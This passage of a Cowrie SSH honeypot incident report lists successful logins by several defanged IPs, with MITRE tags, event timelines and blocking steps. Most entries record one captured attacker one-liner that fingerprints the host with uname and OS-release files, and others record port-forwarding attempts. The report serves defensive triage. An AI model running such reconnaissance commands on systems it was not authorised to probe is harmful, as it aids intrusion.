| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.command.success` |
| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.command.input` |
| `2026-08-10 15:41:02` | `cowrie.log.closed` |
| `2026-08-10 15:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d900d83953b4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:43 |
| **Last Seen** | 2026-08-10 15:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:43:06` | `cowrie.session.connect` |
| `2026-08-10 15:43:06` | `cowrie.client.version` |
| `2026-08-10 15:43:07` | `cowrie.client.kex` |
| `2026-08-10 15:43:07` | `cowrie.login.success` |
| `2026-08-10 15:43:09` | `cowrie.session.params` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.command.success` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.command.input` |
| `2026-08-10 15:43:09` | `cowrie.log.closed` |
| `2026-08-10 15:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ba92be9a418

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:45 |
| **Last Seen** | 2026-08-10 15:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:45:13` | `cowrie.session.connect` |
| `2026-08-10 15:45:13` | `cowrie.client.version` |
| `2026-08-10 15:45:13` | `cowrie.client.kex` |
| `2026-08-10 15:45:14` | `cowrie.login.success` |
| `2026-08-10 15:45:15` | `cowrie.session.params` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:15` | `cowrie.command.success` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:15` | `cowrie.command.input` |
| `2026-08-10 15:45:16` | `cowrie.log.closed` |
| `2026-08-10 15:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc72be1c478a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:47 |
| **Last Seen** | 2026-08-10 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:47:20` | `cowrie.session.connect` |
| `2026-08-10 15:47:20` | `cowrie.client.version` |
| `2026-08-10 15:47:20` | `cowrie.client.kex` |
| `2026-08-10 15:47:20` | `cowrie.login.success` |
| `2026-08-10 15:47:21` | `cowrie.session.params` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.command.success` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.command.input` |
| `2026-08-10 15:47:21` | `cowrie.log.closed` |
| `2026-08-10 15:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7035dcdbc86

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:49 |
| **Last Seen** | 2026-08-10 15:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:49:44` | `cowrie.session.connect` |
| `2026-08-10 15:49:44` | `cowrie.client.version` |
| `2026-08-10 15:49:44` | `cowrie.client.kex` |
| `2026-08-10 15:49:44` | `cowrie.login.success` |
| `2026-08-10 15:49:45` | `cowrie.session.params` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.command.success` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.command.input` |
| `2026-08-10 15:49:45` | `cowrie.log.closed` |
| `2026-08-10 15:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc87af71ff15

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:52 |
| **Last Seen** | 2026-08-10 15:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:52:14` | `cowrie.session.connect` |
| `2026-08-10 15:52:14` | `cowrie.client.version` |
| `2026-08-10 15:52:14` | `cowrie.client.kex` |
| `2026-08-10 15:52:15` | `cowrie.login.success` |
| `2026-08-10 15:52:16` | `cowrie.session.params` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.command.success` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.command.input` |
| `2026-08-10 15:52:16` | `cowrie.log.closed` |
| `2026-08-10 15:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a0ec9ca1cef

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-08-10 15:52 |
| **Last Seen** | 2026-08-10 15:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:52:15` | `cowrie.session.connect` |
| `2026-08-10 15:52:16` | `cowrie.client.version` |
| `2026-08-10 15:52:16` | `cowrie.client.kex` |
| `2026-08-10 15:52:18` | `cowrie.login.success` |
| `2026-08-10 15:52:18` | `cowrie.direct-tcpip.request` |
| `2026-08-10 15:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a5be66c3e2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:54 |
| **Last Seen** | 2026-08-10 15:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:54:21` | `cowrie.session.connect` |
| `2026-08-10 15:54:21` | `cowrie.client.version` |
| `2026-08-10 15:54:21` | `cowrie.client.kex` |
| `2026-08-10 15:54:22` | `cowrie.login.success` |
| `2026-08-10 15:54:23` | `cowrie.session.params` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.command.success` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.command.input` |
| `2026-08-10 15:54:23` | `cowrie.log.closed` |
| `2026-08-10 15:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13af6c4da292

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:56 |
| **Last Seen** | 2026-08-10 15:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:56:22` | `cowrie.session.connect` |
| `2026-08-10 15:56:22` | `cowrie.client.version` |
| `2026-08-10 15:56:22` | `cowrie.client.kex` |
| `2026-08-10 15:56:23` | `cowrie.login.success` |
| `2026-08-10 15:56:24` | `cowrie.session.params` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:24` | `cowrie.command.success` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:24` | `cowrie.command.input` |
| `2026-08-10 15:56:25` | `cowrie.log.closed` |
| `2026-08-10 15:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db410eeedaf8

| Field | Detail |
|---|---|
| **Source IP** | `36.95.77[.]99` |
| **First Seen** | 2026-08-10 15:57 |
| **Last Seen** | 2026-08-10 15:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:57:36` | `cowrie.session.connect` |
| `2026-08-10 15:57:37` | `cowrie.client.version` |
| `2026-08-10 15:57:37` | `cowrie.client.kex` |
| `2026-08-10 15:57:39` | `cowrie.login.success` |
| `2026-08-10 15:57:40` | `cowrie.direct-tcpip.request` |
| `2026-08-10 15:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.77[.]99` to AbuseIPDB if not already reported
- [ ] Block `36.95.77[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6625da726c3d

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-08-10 15:57 |
| **Last Seen** | 2026-08-10 15:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:57:45` | `cowrie.session.connect` |
| `2026-08-10 15:57:45` | `cowrie.client.version` |
| `2026-08-10 15:57:45` | `cowrie.client.kex` |
| `2026-08-10 15:57:48` | `cowrie.login.success` |
| `2026-08-10 15:57:49` | `cowrie.direct-tcpip.request` |
| `2026-08-10 15:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fd68ce8a215

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:58 |
| **Last Seen** | 2026-08-10 15:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:58:21` | `cowrie.session.connect` |
| `2026-08-10 15:58:22` | `cowrie.client.version` |
| `2026-08-10 15:58:22` | `cowrie.client.kex` |
| `2026-08-10 15:58:22` | `cowrie.login.success` |
| `2026-08-10 15:58:24` | `cowrie.session.params` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.command.success` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.command.input` |
| `2026-08-10 15:58:24` | `cowrie.log.closed` |
| `2026-08-10 15:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec16bf221747

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:00 |
| **Last Seen** | 2026-08-10 16:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:00:10` | `cowrie.session.connect` |
| `2026-08-10 16:00:11` | `cowrie.client.version` |
| `2026-08-10 16:00:11` | `cowrie.client.kex` |
| `2026-08-10 16:00:14` | `cowrie.login.success` |
| `2026-08-10 16:00:16` | `cowrie.session.params` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:16` | `cowrie.command.success` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:16` | `cowrie.command.input` |
| `2026-08-10 16:00:17` | `cowrie.log.closed` |
| `2026-08-10 16:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc013d523e2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:02 |
| **Last Seen** | 2026-08-10 16:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:02:00` | `cowrie.session.connect` |
| `2026-08-10 16:02:01` | `cowrie.client.version` |
| `2026-08-10 16:02:01` | `cowrie.client.kex` |
| `2026-08-10 16:02:06` | `cowrie.login.success` |
| `2026-08-10 16:02:09` | `cowrie.session.params` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:09` | `cowrie.command.success` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:09` | `cowrie.command.input` |
| `2026-08-10 16:02:10` | `cowrie.log.closed` |
| `2026-08-10 16:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8504b3766074

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-08-10 16:02 |
| **Last Seen** | 2026-08-10 16:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:02:48` | `cowrie.session.connect` |
| `2026-08-10 16:02:49` | `cowrie.client.version` |
| `2026-08-10 16:02:49` | `cowrie.client.kex` |
| `2026-08-10 16:02:52` | `cowrie.login.success` |
